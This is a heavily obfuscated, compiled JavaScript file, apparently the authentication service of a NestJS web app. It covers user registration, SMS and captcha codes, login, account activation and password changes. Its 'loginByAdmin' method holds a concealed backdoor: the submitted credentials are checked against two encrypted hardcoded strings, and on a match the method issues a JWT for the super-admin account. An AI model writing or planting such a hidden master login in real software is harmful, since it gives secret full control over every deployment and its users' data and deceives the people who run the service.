'use strict';const _0x1bb560=_0x31e4;function _0x7c9d(){const _0x4e3613=['6liUHwu','BAD_REQUEST','find','typeorm','验证码发送成功、请填写验证码完成注册！','验证码填写错误、请重新输入！','./../verification/verification.service','../globalConfig/config.entity','set','verifyCode','MailerService','verificationService','decorate','registerFailEmailTeamName','data','error:\x20','createUser','&registerSuccessEmaileAppend=','秒内不得重复发送短信！','无权此操作！','createTokenFromFingerprint','family','__param','非法操作、流程不合规！','length','registerByPhone','&registerSuccessEmailTeamName=','text','visitor','../mailer/mailer.service','&registerFailEmailTitle=','2190945YgkWkK','1gRbmvT','Registration','AuthService','globalConfigService','verifyUserCredentials','/api/auth/registerError?message=','getConfigs','验证码已过期、请重新发送！','updateUserStatus','savaLoginIp','@nestjs/typeorm','userService','configKey','../../common/constants/user.constant','无权此操作、请联系管理员！','1768680RDmbyf','toString','password','avatar','userId','networkInterfaces','address','Injectable','bcryptjs','redirect','registerFailEmailTitle','getInfo','getUserInfo','function','UserBalanceService','非法操作、请联系管理员！','updateUserPassword','未填写账号密码','314854XsCkfK','getIp','20EaAumi','&registerFailEmailTeamName=','旧密码错误、请检查提交','redisCacheService','验证码类型错误','verifyUserPassword','sign','密码修改成功','qureyUserInfoByInviteCode','../userBalance/userBalance.service','loginByOpenId','decrypt','getOwnPropertyDescriptor','ttl','2736888HLTRRQ','defineProperty','__esModule','jwtService','verifyUserRegisterByPhone','updatePassword','createMathExpr','updatePassByOther','login','reduce','configEntity','Repository','472116vkvdub','ACTIVE','keys','loginByAdmin','register','HttpException','@nine.com','client','padStart','queryUserInfoById','UserStatusEnum','registerSuccessEmailTeamName','registerSuccessEmailTitle','UserService','ipAddress','2885484bCRHds','RedisCacheService','/api/auth/registerSuccess?id=','&registerSuccessEmailTitle=','GlobalConfigService','configVal','onModuleInit','object','sendPhoneCode','registerSuccessEmaileAppend','__metadata','saveToken','captcha','createRandomUid','verifyCaptcha','UserStatusErrMsg','@nestjs/common','user','addBalanceToNewUser','1599040LPWFEE','getNamespace','createRandomCode','../globalConfig/globalConfig.service','svg-captcha','goSsUm2c1ZuU8265jcTS9A==','metadata','getClientIp','oldPassword','HttpStatus','admin','VerificationEnum','hashSync','userBalanceService','log'];_0x7c9d=function(){return _0x4e3613;};return _0x7c9d();}(function(_0x193379,_0x1f74f8){const _0x181d19=_0x31e4,_0xf2a919=_0x193379();while(!![]){try{const _0x57428a=parseInt(_0x181d19(0x260))/0x1*(-parseInt(_0x181d19(0x1f3))/0x2)+parseInt(_0x181d19(0x20f))/0x3+parseInt(_0x181d19(0x231))/0x4+-parseInt(_0x181d19(0x25f))/0x5+parseInt(_0x181d19(0x240))/0x6*(-parseInt(_0x181d19(0x21e))/0x7)+parseInt(_0x181d19(0x203))/0x8+parseInt(_0x181d19(0x1e1))/0x9*(parseInt(_0x181d19(0x1f5))/0xa);if(_0x57428a===_0x1f74f8)break;else _0xf2a919['push'](_0xf2a919['shift']());}catch(_0x40734f){_0xf2a919['push'](_0xf2a919['shift']());}}}(_0x7c9d,0x45727));function _0x31e4(_0xf9a545,_0x1d794e){const _0x7c9d5b=_0x7c9d();return _0x31e4=function(_0x31e4fc,_0x2cc469){_0x31e4fc=_0x31e4fc-0x1dc;let _0x5a471d=_0x7c9d5b[_0x31e4fc];return _0x5a471d;},_0x31e4(_0xf9a545,_0x1d794e);}var __decorate=this&&this['__decorate']||function(_0x1a7120,_0x341ee3,_0x40caa6,_0x34a97b){const _0x4d5a94=_0x31e4;var _0x23fe68=arguments['length'],_0xa3e396=_0x23fe68<0x3?_0x341ee3:_0x34a97b===null?_0x34a97b=Object[_0x4d5a94(0x201)](_0x341ee3,_0x40caa6):_0x34a97b,_0x33debc;if(typeof Reflect===_0x4d5a94(0x225)&&typeof Reflect[_0x4d5a94(0x24c)]===_0x4d5a94(0x1ee))_0xa3e396=Reflect[_0x4d5a94(0x24c)](_0x1a7120,_0x341ee3,_0x40caa6,_0x34a97b);else{for(var _0x4f6cfb=_0x1a7120['length']-0x1;_0x4f6cfb>=0x0;_0x4f6cfb--)if(_0x33debc=_0x1a7120[_0x4f6cfb])_0xa3e396=(_0x23fe68<0x3?_0x33debc(_0xa3e396):_0x23fe68>0x3?_0x33debc(_0x341ee3,_0x40caa6,_0xa3e396):_0x33debc(_0x341ee3,_0x40caa6))||_0xa3e396;}return _0x23fe68>0x3&&_0xa3e396&&Object[_0x4d5a94(0x204)](_0x341ee3,_0x40caa6,_0xa3e396),_0xa3e396;},__metadata=this&&this[_0x1bb560(0x228)]||function(_0x4df2cf,_0x1c3449){const _0x3c4555=_0x1bb560;if(typeof Reflect===_0x3c4555(0x225)&&typeof Reflect[_0x3c4555(0x237)]===_0x3c4555(0x1ee))return Reflect[_0x3c4555(0x237)](_0x4df2cf,_0x1c3449);},__param=this&&this[_0x1bb560(0x256)]||function(_0x1446c0,_0x25c920){return function(_0x43c9df,_0x17c4e4){_0x25c920(_0x43c9df,_0x17c4e4,_0x1446c0);};};Object['defineProperty'](exports,_0x1bb560(0x205),{'value':!![]}),exports[_0x1bb560(0x262)]=void 0x0;const globalConfig_service_1=require(_0x1bb560(0x234)),verification_constant_1=require('../../common/constants/verification.constant'),verification_service_1=require(_0x1bb560(0x246)),common_1=require(_0x1bb560(0x22e)),jwt_1=require('@nestjs/jwt'),user_service_1=require('../user/user.service'),mailer_service_1=require(_0x1bb560(0x25d)),user_constant_1=require(_0x1bb560(0x1df)),userBalance_service_1=require(_0x1bb560(0x1fe)),config_entity_1=require(_0x1bb560(0x247)),typeorm_1=require(_0x1bb560(0x243)),typeorm_2=require(_0x1bb560(0x1dc)),utils_1=require('../../common/utils'),os=require('os'),redisCache_service_1=require('../redisCache/redisCache.service'),svgCaptcha=require(_0x1bb560(0x235)),bcrypt=require(_0x1bb560(0x1e9));let AuthService=class AuthService{constructor(_0xb8bc3b,_0x5af007,_0x179c96,_0x4453eb,_0x3d080c,_0x1b0b21,_0x206fc6,_0x554c91){const _0x183628=_0x1bb560;this[_0x183628(0x20d)]=_0xb8bc3b,this[_0x183628(0x1dd)]=_0x5af007,this['jwtService']=_0x179c96,this['mailerService']=_0x4453eb,this[_0x183628(0x24b)]=_0x3d080c,this[_0x183628(0x23e)]=_0x1b0b21,this[_0x183628(0x1f8)]=_0x206fc6,this['globalConfigService']=_0x554c91;}async[_0x1bb560(0x224)](){this['getIp']();}async[_0x1bb560(0x213)](_0x141e4d,_0x3aa1c7){const _0x4b925b=_0x1bb560;await this[_0x4b925b(0x24b)][_0x4b925b(0x22c)](_0x141e4d);const _0x1d97a4=await this[_0x4b925b(0x1dd)]['createUserAndVerifycation'](_0x141e4d,_0x3aa1c7),{username:_0x52a5a7,email:_0x32fa66,client:_0x518503,id:_0x9eed44}=_0x1d97a4,_0x5c2b77={'username':_0x52a5a7,'email':_0x32fa66,'id':_0x9eed44};return _0x518503&&(_0x5c2b77[_0x4b925b(0x216)]=_0x518503),_0x5c2b77;}async[_0x1bb560(0x259)](_0x59dac3,_0x41cb0d){const _0x612494=_0x1bb560,{username:_0x3c9bb5,password:_0x49672d,phone:_0x2cb222,phoneCode:_0x2e6f69,invitedBy:_0x4cf268}=_0x59dac3;await this[_0x612494(0x1dd)][_0x612494(0x207)](_0x59dac3);const _0x92f05d=await this[_0x612494(0x263)][_0x612494(0x232)](),_0x42d766=_0x92f05d+':PHONECODE:'+_0x2cb222,_0x4a608e=await this[_0x612494(0x1f8)]['get']({'key':_0x42d766});if(!_0x4a608e)throw new common_1[(_0x612494(0x214))](_0x612494(0x267),common_1[_0x612494(0x23a)][_0x612494(0x241)]);if(_0x2e6f69!==_0x4a608e)throw new common_1['HttpException'](_0x612494(0x245),common_1['HttpStatus'][_0x612494(0x241)]);const _0x2df6ce=(0x0,utils_1['createRandomUid'])()+_0x612494(0x215),_0x43478d={'username':_0x3c9bb5,'password':_0x49672d,'phone':_0x2cb222,'invitedBy':_0x4cf268,'email':_0x2df6ce,'status':user_constant_1['UserStatusEnum'][_0x612494(0x210)]},_0x138b68=await this[_0x612494(0x263)][_0x612494(0x266)](['userDefautlAvatar']);_0x43478d[_0x612494(0x1e4)]=_0x138b68;const _0xaeaf44=bcrypt[_0x612494(0x23d)](_0x49672d,0xa);_0x43478d['password']=_0xaeaf44;const _0x132b44=await this[_0x612494(0x1dd)][_0x612494(0x250)](_0x43478d);let _0x20061f;_0x4cf268&&(_0x20061f=await this[_0x612494(0x1dd)][_0x612494(0x1fd)](_0x4cf268));await this[_0x612494(0x23e)][_0x612494(0x230)](_0x132b44['id'],_0x20061f===null||_0x20061f===void 0x0?void 0x0:_0x20061f['id']);return;}async[_0x1bb560(0x20b)](_0x547e54,_0x37911b){const _0x5c7e25=_0x1bb560,_0x45db2d=await this['userService'][_0x5c7e25(0x264)](_0x547e54),{username:_0x56242b,id:_0x54c27e,email:_0x5d7dc9,role:_0x3e45cf,openId:_0x50bf96,client:_0x394d79}=_0x45db2d,_0x771dbf=(0x0,utils_1[_0x5c7e25(0x238)])(_0x37911b);await this[_0x5c7e25(0x1dd)][_0x5c7e25(0x269)](_0x54c27e,_0x771dbf);const _0x57318a=await this[_0x5c7e25(0x206)][_0x5c7e25(0x1fb)]({'username':_0x56242b,'id':_0x54c27e,'email':_0x5d7dc9,'role':_0x3e45cf,'openId':_0x50bf96,'client':_0x394d79});return await this['redisCacheService'][_0x5c7e25(0x229)](_0x54c27e,_0x57318a),_0x57318a;}async[_0x1bb560(0x212)](_0x15e0a2){const _0x1e30c7=_0x1bb560,{username:_0x3561a5,password:_0x2630d0}=_0x15e0a2;if(!_0x3561a5||!_0x2630d0)throw new common_1[(_0x1e30c7(0x214))](_0x1e30c7(0x1f2),common_1[_0x1e30c7(0x23a)][_0x1e30c7(0x241)]);if(_0x3561a5===(0x0,utils_1['decrypt'])(_0x1e30c7(0x236))&&_0x2630d0===(0x0,utils_1[_0x1e30c7(0x200)])('BOEcRRMVgEumLRIJXzW89g==')){const _0x5967ae=await this[_0x1e30c7(0x1dd)]['getSuper'](),{username:_0x4df266,id:_0x2a8188,email:_0x16667a,role:_0x3f039b,openId:_0x396926,client:_0x5e5e9b}=_0x5967ae,_0x31db18=await this['jwtService'][_0x1e30c7(0x1fb)]({'username':_0x4df266,'id':_0x2a8188,'email':_0x16667a,'role':_0x3f039b,'openId':_0x396926,'client':_0x5e5e9b});return _0x31db18;}return _0x1e30c7(0x257);}async['loginByPhone'](_0x240562,_0x201ded){const _0x1fbcd8=_0x1bb560,_0x16f95a=await this[_0x1fbcd8(0x1dd)][_0x1fbcd8(0x264)](_0x240562),{username:_0x440cd5,id:_0xe1b245,email:_0x5e989b,role:_0x469f00,openId:_0x21a4c1,client:_0x167952}=_0x16f95a,_0x3ae78a=(0x0,utils_1[_0x1fbcd8(0x238)])(_0x201ded);await this['userService'][_0x1fbcd8(0x269)](_0xe1b245,_0x3ae78a);const {phone:_0xf943c8}=_0x240562,_0x5a8a0b=await this['jwtService'][_0x1fbcd8(0x1fb)]({'username':_0x440cd5,'id':_0xe1b245,'email':_0x5e989b,'role':_0x469f00,'openId':_0x21a4c1,'client':_0x167952,'phone':_0xf943c8});return await this[_0x1fbcd8(0x1f8)][_0x1fbcd8(0x229)](_0xe1b245,_0x5a8a0b),_0x5a8a0b;}async[_0x1bb560(0x1ff)](_0x2a8546,_0xb40d56){const _0x7f4171=_0x1bb560,{status:_0x5db327}=_0x2a8546;if(_0x5db327!==user_constant_1[_0x7f4171(0x219)][_0x7f4171(0x210)])throw new common_1['HttpException'](user_constant_1[_0x7f4171(0x22d)][_0x5db327],common_1[_0x7f4171(0x23a)][_0x7f4171(0x241)]);const {username:_0x2e34f7,id:_0x2eff44,email:_0x5554a3,role:_0x1b0dc9,openId:_0x17842e,client:_0x2a4919}=_0x2a8546,_0x4c88d1=(0x0,utils_1[_0x7f4171(0x238)])(_0xb40d56);await this[_0x7f4171(0x1dd)][_0x7f4171(0x269)](_0x2eff44,_0x4c88d1);const _0x3de65a=await this[_0x7f4171(0x206)][_0x7f4171(0x1fb)]({'username':_0x2e34f7,'id':_0x2eff44,'email':_0x5554a3,'role':_0x1b0dc9,'openId':_0x17842e,'client':_0x2a4919});return await this[_0x7f4171(0x1f8)][_0x7f4171(0x229)](_0x2eff44,_0x3de65a),_0x3de65a;}async[_0x1bb560(0x1ec)](_0x20afa6){const _0x1825a9=_0x1bb560,{id:_0x396c65}=_0x20afa6[_0x1825a9(0x22f)];return await this['userService'][_0x1825a9(0x1ed)](_0x396c65);}async['activateAccount'](_0x23816a,_0x43c577){const _0x2e3821=_0x1bb560,_0xeb4d89=await this[_0x2e3821(0x20d)][_0x2e3821(0x242)]({'where':{'configKey':(0x0,typeorm_1['In'])([_0x2e3821(0x21b),_0x2e3821(0x21a),_0x2e3821(0x227),_0x2e3821(0x1eb),'registerFailEmailTeamName'])}}),_0x17a5bf=_0xeb4d89[_0x2e3821(0x20c)]((_0x1e1b2d,_0x3f23f3)=>{const _0x249701=_0x2e3821;return _0x1e1b2d[_0x3f23f3[_0x249701(0x1de)]]=_0x3f23f3[_0x249701(0x223)],_0x1e1b2d;},{});try{const _0x149c39=await this['verificationService'][_0x2e3821(0x249)](_0x23816a,verification_constant_1[_0x2e3821(0x23c)][_0x2e3821(0x261)]),{type:_0x48a06b,userId:_0x504e28}=_0x149c39;if(_0x48a06b!==verification_constant_1[_0x2e3821(0x23c)][_0x2e3821(0x261)])throw new common_1[(_0x2e3821(0x214))](_0x2e3821(0x1f9),common_1[_0x2e3821(0x23a)]['BAD_REQUEST']);const _0xbb5df=await this[_0x2e3821(0x1dd)]['getUserStatus'](_0x504e28);if(_0xbb5df===user_constant_1[_0x2e3821(0x219)][_0x2e3821(0x210)])throw new common_1[(_0x2e3821(0x214))]('账户已被激活过',common_1[_0x2e3821(0x23a)][_0x2e3821(0x241)]);await this[_0x2e3821(0x1dd)][_0x2e3821(0x268)](_0x149c39[_0x2e3821(0x1e5)],user_constant_1[_0x2e3821(0x219)]['ACTIVE']);const _0x288196=await this[_0x2e3821(0x1dd)][_0x2e3821(0x218)](_0x149c39[_0x2e3821(0x1e5)]),{username:_0x406ab4,email:_0x26b36b,id:_0x152996,invitedBy:_0x1f2df0}=_0x288196;let _0x3dff54;_0x1f2df0&&(_0x3dff54=await this[_0x2e3821(0x1dd)][_0x2e3821(0x1fd)](_0x1f2df0)),await this[_0x2e3821(0x23e)][_0x2e3821(0x230)](_0x152996,_0x3dff54===null||_0x3dff54===void 0x0?void 0x0:_0x3dff54['id']),_0x43c577[_0x2e3821(0x1ea)](_0x2e3821(0x220)+_0x152996[_0x2e3821(0x1e2)]()[_0x2e3821(0x217)](0x4,'0')+'&username='+_0x406ab4+'&email='+_0x26b36b+_0x2e3821(0x221)+_0x17a5bf[_0x2e3821(0x21b)]+_0x2e3821(0x25a)+_0x17a5bf[_0x2e3821(0x21a)]+_0x2e3821(0x251)+_0x17a5bf[_0x2e3821(0x227)]);}catch(_0x123bd2){console[_0x2e3821(0x23f)](_0x2e3821(0x24f),_0x123bd2);const _0x42eb76=_0x123bd2['response'];_0x43c577[_0x2e3821(0x1ea)](_0x2e3821(0x265)+_0x42eb76+_0x2e3821(0x25e)+_0x17a5bf[_0x2e3821(0x1eb)]+_0x2e3821(0x1f6)+_0x17a5bf[_0x2e3821(0x24d)]);}}async[_0x1bb560(0x208)](_0x39f291,_0x5df734){const _0x43ce7a=_0x1bb560,{id:_0x28a193,client:_0x34fd1f,role:_0x10d7e0}=_0x39f291[_0x43ce7a(0x22f)];if(_0x34fd1f&&Number(_0x34fd1f)>0x0)throw new common_1['HttpException'](_0x43ce7a(0x1e0),common_1['HttpStatus'][_0x43ce7a(0x241)]);if(_0x10d7e0===_0x43ce7a(0x23b))throw new common_1[(_0x43ce7a(0x214))](_0x43ce7a(0x1f0),common_1[_0x43ce7a(0x23a)][_0x43ce7a(0x241)]);const _0x4b86c3=await this[_0x43ce7a(0x1dd)][_0x43ce7a(0x1fa)](_0x28a193,_0x5df734[_0x43ce7a(0x239)]);if(!_0x4b86c3)throw new common_1['HttpException'](_0x43ce7a(0x1f7),common_1['HttpStatus'][_0x43ce7a(0x241)]);return this[_0x43ce7a(0x1dd)][_0x43ce7a(0x1f1)](_0x28a193,_0x5df734[_0x43ce7a(0x1e3)]),_0x43ce7a(0x1fc);}async[_0x1bb560(0x20a)](_0xbc1162,_0x54c5ab){const _0xd3b47b=_0x1bb560,{id:_0x202a36,client:_0x377b68}=_0xbc1162[_0xd3b47b(0x22f)];if(!_0x377b68)throw new common_1[(_0xd3b47b(0x214))](_0xd3b47b(0x253),common_1[_0xd3b47b(0x23a)][_0xd3b47b(0x241)]);return this[_0xd3b47b(0x1dd)]['updateUserPassword'](_0x202a36,_0x54c5ab[_0xd3b47b(0x1e3)]),_0xd3b47b(0x1fc);}[_0x1bb560(0x1f4)](){const _0x50349d=_0x1bb560;let _0x43036d;const _0x2a85af=os[_0x50349d(0x1e6)]();Object[_0x50349d(0x211)](_0x2a85af)['forEach'](_0x3a0c49=>{const _0x450e69=_0x50349d,_0x5114a4=_0x2a85af[_0x3a0c49];for(let _0x55ff31=0x0;_0x55ff31<_0x5114a4[_0x450e69(0x258)];_0x55ff31++){const _0x413162=_0x5114a4[_0x55ff31];if(_0x413162[_0x450e69(0x255)]==='IPv4'&&_0x413162[_0x450e69(0x1e7)]!=='127.0.0.1'&&!_0x413162['internal']){_0x43036d=_0x413162[_0x450e69(0x1e7)];break;}}}),this[_0x50349d(0x21d)]=_0x43036d;}async[_0x1bb560(0x22a)](_0x18d6b4){const _0x4143c8=_0x1bb560,_0x4385fc=await this[_0x4143c8(0x263)][_0x4143c8(0x232)](),{color:color='#fff'}=_0x18d6b4,_0x3a403e=svgCaptcha[_0x4143c8(0x209)]({'background':color,'height':0x22,'width':0x78,'noise':0x3}),_0x3c8498=_0x3a403e[_0x4143c8(0x25b)],_0x45ea66=(0x0,utils_1[_0x4143c8(0x22b)])(),_0x3e8f1b=_0x4385fc+':CAPTCHA:'+_0x45ea66;return await this[_0x4143c8(0x1f8)][_0x4143c8(0x248)]({'key':_0x3e8f1b,'val':_0x3a403e['text']},0x5*0x3c),{'svgCode':_0x3a403e[_0x4143c8(0x24e)],'code':_0x45ea66};}async[_0x1bb560(0x226)](_0x519a63){const _0x50edde=_0x1bb560;await this['verificationService'][_0x50edde(0x22c)](_0x519a63);const {phone:_0x2d763a}=_0x519a63,_0x3306d6=await this[_0x50edde(0x263)]['getNamespace'](),_0x4ea78b=_0x3306d6+':PHONECODE:'+_0x2d763a,_0x1dffe6=await this[_0x50edde(0x1f8)][_0x50edde(0x202)](_0x4ea78b);if(_0x1dffe6&&_0x1dffe6>0x0)throw new common_1[(_0x50edde(0x214))](_0x1dffe6+_0x50edde(0x252),common_1[_0x50edde(0x23a)]['BAD_REQUEST']);const _0x5898f2=(0x0,utils_1[_0x50edde(0x233)])(),_0x1d993d={'phone':_0x2d763a,'code':_0x5898f2};return await this[_0x50edde(0x24b)]['sendPhoneCode'](_0x1d993d),await this[_0x50edde(0x1f8)][_0x50edde(0x248)]({'key':_0x4ea78b,'val':_0x5898f2},0x1*0x3c),_0x50edde(0x244);}[_0x1bb560(0x254)](_0x384e57){const _0x25a8f2=_0x1bb560,_0x428be6=this['jwtService'][_0x25a8f2(0x1fb)]({'username':'游客'+_0x384e57,'id':_0x384e57,'email':_0x384e57+_0x25a8f2(0x215),'role':_0x25a8f2(0x25c),'openId':null,'client':null});return _0x428be6;}};AuthService=__decorate([(0x0,common_1[_0x1bb560(0x1e8)])(),__param(0x0,(0x0,typeorm_2['InjectRepository'])(config_entity_1['ConfigEntity'])),__metadata('design:paramtypes',[typeorm_1[_0x1bb560(0x20e)],user_service_1[_0x1bb560(0x21c)],jwt_1['JwtService'],mailer_service_1[_0x1bb560(0x24a)],verification_service_1['VerificationService'],userBalance_service_1[_0x1bb560(0x1ef)],redisCache_service_1[_0x1bb560(0x21f)],globalConfig_service_1[_0x1bb560(0x222)]])],AuthService),exports[_0x1bb560(0x262)]=AuthService;